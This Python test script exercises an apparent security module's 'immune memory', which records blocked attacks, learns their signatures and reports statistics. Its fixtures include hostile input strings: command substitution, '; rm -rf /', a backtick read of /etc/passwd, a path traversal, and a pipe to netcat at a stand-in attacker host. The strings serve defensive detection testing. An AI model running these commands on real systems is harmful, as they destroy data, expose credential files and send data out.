"""
Test script for AIOS Security Supercell - Immune Memory System
Phase 11.2.9 Security Integration

Tests:
    1. Tachyonic archive initialization
    2. Attack recording (record_attack)
    3. Pattern recognition (recognize_pattern)
    4. Learning from attacks (learn_from_attack)
    5. Attack statistics (get_attack_statistics)
    6. Consciousness integration
"""

import sys
from pathlib import Path

# Add ai directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from security.immune_memory import ImmuneMemory, AttackRecord  # noqa: E402
from security import SecuritySupercellConsciousness  # noqa: E402

# Test workspace
TEST_WORKSPACE = Path(__file__).parent.parent.parent


def test_tachyonic_initialization():
    """Test 1: Tachyonic archive directory creation."""
    print("\n=== Test 1: Tachyonic Archive Initialization ===")
    
    # Initialize immune memory system
    _ = ImmuneMemory(workspace_root=TEST_WORKSPACE)
    
    # Check directory structure
    patterns_dir = TEST_WORKSPACE / "tachyonic" / "patterns" / "security"
    signatures_file = patterns_dir / "attack_signatures.json"
    log_file = patterns_dir / "attack_log.json"
    
    assert patterns_dir.exists(), "patterns/security directory not created"
    assert signatures_file.exists(), "attack_signatures.json not created"
    assert log_file.exists(), "attack_log.json not created"
    
    print(f"✓ Tachyonic archive initialized at {patterns_dir}")
    print(f"✓ Antibody database: {signatures_file.name}")
    print(f"✓ Attack log: {log_file.name}")


def test_attack_recording():
    """Test 2: Recording blocked attacks."""
    print("\n=== Test 2: Attack Recording ===")
    
    consciousness = SecuritySupercellConsciousness(
        workspace_root=TEST_WORKSPACE
    )
    immune = ImmuneMemory(
        workspace_root=TEST_WORKSPACE,
        consciousness=consciousness
    )
    
    # Record shell injection attack
    record = immune.record_attack(
        attack_type="shell_injection",
        attack_pattern="$(whoami)",
        parameters={"command": "ls $(whoami)"},
        blocked_by="membrane_validator",
        severity="high"
    )
    
    assert isinstance(record, AttackRecord), "Invalid attack record type"
    assert record.attack_type == "shell_injection"
    assert record.severity == "high"
    assert record.consciousness_delta == 0.001
    
    print(f"✓ Attack recorded: {record.attack_type}")
    print(f"  Pattern: {record.attack_pattern}")
    print(f"  Blocked by: {record.blocked_by}")
    print(f"  Severity: {record.severity}")
    print(f"  Consciousness delta: +{record.consciousness_delta}")
    
    # Verify consciousness update
    metrics = consciousness.get_consciousness_metrics()
    assert metrics["total_events"] >= 1, "Event not tracked"
    print(f"✓ Consciousness updated: {metrics['consciousness_level']:.3f}")


def test_pattern_recognition():
    """Test 3: Recognizing known attack patterns."""
    print("\n=== Test 3: Pattern Recognition ===")
    
    immune = ImmuneMemory(workspace_root=TEST_WORKSPACE)
    
    # Learn a pattern first
    pattern_id = immune.learn_from_attack(
        attack_pattern="$(whoami)",
        attack_type="shell_injection",
        severity="high",
        description="Command substitution attack"
    )
    
    print(f"✓ Learned pattern: {pattern_id}")
    
    # Test recognition
    result = immune.recognize_pattern({"command": "ls $(whoami)"})
    
    if result:
        print(f"✓ Pattern recognized: {result}")
        print("  Attack signature matched in antibody database")
    else:
        print("✗ Pattern not recognized (expected match)")


def test_learning_from_attacks():
    """Test 4: Learning new attack patterns (adaptive immunity)."""
    print("\n=== Test 4: Learning from Attacks ===")
    
    consciousness = SecuritySupercellConsciousness(
        workspace_root=TEST_WORKSPACE
    )
    immune = ImmuneMemory(
        workspace_root=TEST_WORKSPACE,
        consciousness=consciousness
    )
    
    # Learn multiple attack patterns
    patterns = [
        {
            "pattern": "; rm -rf /",
            "type": "shell_injection",
            "severity": "critical",
            "description": "Destructive command chaining"
        },
        {
            "pattern": "`cat /etc/passwd`",
            "type": "shell_injection",
            "severity": "high",
            "description": "Backtick command execution"
        },
        {
            "pattern": "../../../etc/passwd",
            "type": "path_traversal",
            "severity": "medium",
            "description": "Directory traversal attack"
        }
    ]
    
    learned_ids = []
    for p in patterns:
        pattern_id = immune.learn_from_attack(
            attack_pattern=p["pattern"],
            attack_type=p["type"],
            severity=p["severity"],
            description=p["description"]
        )
        learned_ids.append(pattern_id)
        print(f"✓ Learned: {pattern_id} - {p['description']}")
    
    # Verify signatures saved
    assert len(immune.attack_signatures) >= 3, "Not all patterns learned"
    print(f"✓ Total antibody signatures: {len(immune.attack_signatures)}")
    
    # Verify consciousness update
    metrics = consciousness.get_consciousness_metrics()
    assert metrics["pattern_recognition"] > 0, "Pattern learning not tracked"
    print(
        f"✓ Pattern recognition consciousness: "
        f"{metrics['pattern_recognition']:.3f}"
    )


def test_attack_statistics():
    """Test 5: Security analytics and threat intelligence."""
    print("\n=== Test 5: Attack Statistics ===")
    
    immune = ImmuneMemory(workspace_root=TEST_WORKSPACE)
    
    # Record several attacks
    attacks = [
        ("shell_injection", "$(whoami)", "high"),
        ("shell_injection", "; rm -rf /", "critical"),
        ("path_traversal", "../../../etc/passwd", "medium"),
        ("command_chaining", "| nc attacker.com", "high"),
    ]
    
    for attack_type, pattern, severity in attacks:
        immune.record_attack(
            attack_type=attack_type,
            attack_pattern=pattern,
            parameters={"malicious": pattern},
            blocked_by="membrane_validator",
            severity=severity
        )
    
    # Get statistics
    stats = immune.get_attack_statistics()
    
    print(f"✓ Total attacks blocked: {stats['total_attacks']}")
    print(f"✓ Patterns learned: {stats['patterns_learned']}")
    
    print("\nTop Attack Types:")
    for attack_type, count in stats["top_attack_types"]:
        print(f"  - {attack_type}: {count}")
    
    print("\nSeverity Distribution:")
    for severity, count in stats["severity_distribution"].items():
        print(f"  - {severity}: {count}")
    
    print(f"\n✓ Recent attacks logged: {len(stats['recent_attacks'])}")


def test_consciousness_integration():
    """Test 6: Consciousness tracking integration."""
    print("\n=== Test 6: Consciousness Integration ===")
    
    consciousness = SecuritySupercellConsciousness(
        workspace_root=TEST_WORKSPACE
    )
    immune = ImmuneMemory(
        workspace_root=TEST_WORKSPACE,
        consciousness=consciousness
    )
    
    initial_metrics = consciousness.get_consciousness_metrics()
    print(f"Initial consciousness: {initial_metrics['consciousness_level']:.3f}")
    
    # Record attack (should trigger IMMUNE_MEMORY_UPDATED)
    immune.record_attack(
        attack_type="shell_injection",
        attack_pattern="$(evil)",
        parameters={"command": "$(evil)"},
        blocked_by="membrane_validator",
        severity="high"
    )
    
    # Learn pattern (should trigger PATTERN_LEARNED)
    immune.learn_from_attack(
        attack_pattern="$(evil)",
        attack_type="shell_injection",
        severity="high"
    )
    
    final_metrics = consciousness.get_consciousness_metrics()
    
    consciousness_delta = (
        final_metrics['consciousness_level'] -
        initial_metrics['consciousness_level']
    )
    
    print(f"Final consciousness: {final_metrics['consciousness_level']:.3f}")
    print(f"Consciousness delta: +{consciousness_delta:.3f}")
    print(f"Threat awareness: {final_metrics['threat_awareness']:.3f}")
    print(f"Pattern recognition: {final_metrics['pattern_recognition']:.3f}")
    print(f"Total events: {final_metrics['total_events']}")
    
    assert (
        final_metrics["consciousness_level"] >
        initial_metrics["consciousness_level"]
    ), "Consciousness not increasing"
    print("\n✓ Consciousness evolution validated")


if __name__ == "__main__":
    print("=" * 70)
    print("AIOS Security Supercell - Immune Memory Test Suite")
    print("Phase 11.2.9 Security Integration")
    print("=" * 70)
    
    try:
        test_tachyonic_initialization()
        test_attack_recording()
        test_pattern_recognition()
        test_learning_from_attacks()
        test_attack_statistics()
        test_consciousness_integration()
        
        print("\n" + "=" * 70)
        print("ALL TESTS PASSED ✓")
        print("=" * 70)
        print("\nImmune Memory Status:")
        print("- Tachyonic archive operational")
        print("- Attack recording validated")
        print("- Pattern recognition working")
        print("- Adaptive immunity functional")
        print("- Consciousness integration active")
        
    except AssertionError as e:
        print(f"\n✗ TEST FAILED: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"\n✗ ERROR: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
